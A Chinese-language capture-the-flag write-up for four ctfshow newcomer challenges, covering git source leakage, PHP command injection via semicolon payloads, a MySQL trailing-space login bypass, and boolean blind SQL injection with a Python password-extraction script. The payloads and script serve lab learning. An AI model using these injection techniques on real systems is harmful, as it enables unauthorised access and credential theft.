## ctfshow【萌新赛】

### 给她            

从名字看就像`git源码`泄露，我们先用`dirmap`扫描一下：

![image-20230316205346616](https://s2.loli.net/2023/03/16/hSgFYrRqvy5kLuw.png)

果然是git源码泄露，我们使用`githack` 下载泄露的源码：

![image-20230316205511649](https://s2.loli.net/2023/03/16/MK7qWyNLYRJuh9d.png)

这里学到一个新的函数：`sprintf()` 

![image-20230316205737106](https://s2.loli.net/2023/03/16/Nn5HgBRuW2YfPGp.png)





### 签到题

```php
<?php 
if(isset($_GET['url'])){
        system("curl https://".$_GET['url'].".ctf.show");
}else{
        show_source(__FILE__);
}
 ?>
```

看到system就会想到命令执行，我们可以使用分号；去分隔命令。

payload：

```php
?url=;ls;
?url=;cat flag;
```





### 假赛生            

> 提示：register.php login.php 大佬们别扫了

index.php

```php
<?php
session_start();
include('config.php');
if(empty($_SESSION['name'])){
    show_source("index.php");
}else{
    $name=$_SESSION['name'];
    $sql='select pass from user where name="'.$name.'"';
    echo $sql."<br />";
    system('4rfvbgt56yhn.sh');
    $query=mysqli_query($conn,$sql);
    $result=mysqli_fetch_assoc($query);
    if($name==='admin'){
        echo "admin!!!!!"."<br />";
        if(isset($_GET['c'])){
            preg_replace_callback("/\w\W*/",function(){die("not allowed!");},$_GET['c'],1);
            echo $flag;
        }else{
            echo "you not admin";
        }
    }
}
?>
```

根据提示，我们访问`register.php`可以进行注册，访问`login.php`可以进行登录

我们先分析一下源代码index.php，我们首先需要 `$name==='admin'` ，$name是注册的时候设置的session值

只有我们注册的用户为admin才可以绕过第一层

这里有一个tips：

> mysql的`char`、`varchar`、`text`类型进行等值比较时，**会忽略末尾的空格**

例如：

![image-20230316214846624](https://s2.loli.net/2023/03/16/ZIBm6Rh15eYnwD4.png)

末尾的空格被忽略了，我们还是查询出了数据

我们再插入一条数据看看：

![image-20230316215336059](https://s2.loli.net/2023/03/16/kwR6cXG4BYnO2d1.png)

我们发现插入的用户名：`leekos   `  后面的空格也被自动去除了

> 如果我们想要精确查询，可以使用`like`关键字，不会忽略末尾的空格



根据以上分析，我们知道了，我们可以创建名为： `admin`  （后面有一个空格）的用户，这样就可以以admin身份登录了

![image-20230316215657201](https://s2.loli.net/2023/03/16/ltUsSx7cE19euKI.png)



![image-20230316215940405](https://s2.loli.net/2023/03/16/C3PmhegAoj5WKQ9.png)

成功登录，但是我们需要绕过第二层过滤：

```php
if(isset($_GET['c'])){
      preg_replace_callback("/\w\W*/",function(){die("not allowed!");},$_GET['c'],1);
      echo $flag;
}
```

`preg_replace_callback()` 函数作用是匹配到了 `/\w\W*/` 就会执行函数：`function(){die("not allowed!");}`

参数`c` 直接为空就行

![image-20230316220132413](https://s2.loli.net/2023/03/16/vyPdsWRic5HX9TY.png)



### 萌新记忆            

![image-20230316220228711](https://s2.loli.net/2023/03/16/Ofd8GRChEntX2i1.png)

没什么东西，我们使用dirsearch扫一下：

![image-20230316220415018](https://s2.loli.net/2023/03/16/lOGjVv7ecbaKRMY.png)

发现 `/admin/` 目录，我们访问一下，发现是一个登录页面，应该是sql注入

![image-20230316220846375](https://s2.loli.net/2023/03/16/RLYeJsM8a1c5pGm.png)



经过测试，我们发现用户名为：`admin`，并且只有用户名这里有注入点，

当用户名正确时，回显：`密码错误`。当用户名错误时，回显：`用户名/密码错误`

很明显这里需要使用 `布尔盲注`

我们先使用 `fuzz`看一下过滤了哪些字符：

![image-20230316221433875](https://s2.loli.net/2023/03/16/DM64iaS9JY7zBWQ.png)

发现：`or、select、union`等被过滤了

但是：`<、（）、substr、length、||` 没有被过滤，我们可以使用 `||` 去代替`or`

这里注入需查询的方式和以往不同，这里只需要查询出`admin`的密码即可

用户名`admin`的密码字段为：`p`

我们首先使用`length`查询出密码的长度

```
'||length(p)<'17
```

![image-20230316222410754](https://s2.loli.net/2023/03/16/Rkr3I4ydHLwjiWm.png)

```
'||length(p)<'18
```

![image-20230316222622646](https://s2.loli.net/2023/03/16/MytNKJ87pVlihFr.png)

此时说明密码长度为 17位

接下来我们需要使用脚本去获得密码了：

```python
import requests
url="http://97da0123-c533-4807-aca1-35bcc7f088a9.challenge.ctf.show/admin/checklogin.php"
letter="0123456789abcdefghijklmnopqrstuvwxyz"
flag=""
for i in range(1,18):
    for j in letter:
        payload="'||substr(p,{},1)<'{}".format(i,j)
        #print(payload)
        data={
            'u':payload,
            'p':1
            }
        res=requests.post(url=url,data=data).text
        print(res)
        if "密码错误" == res:
            flag += chr(ord(j)-1)
            print(flag)
            break
```

然后登录得到flag



































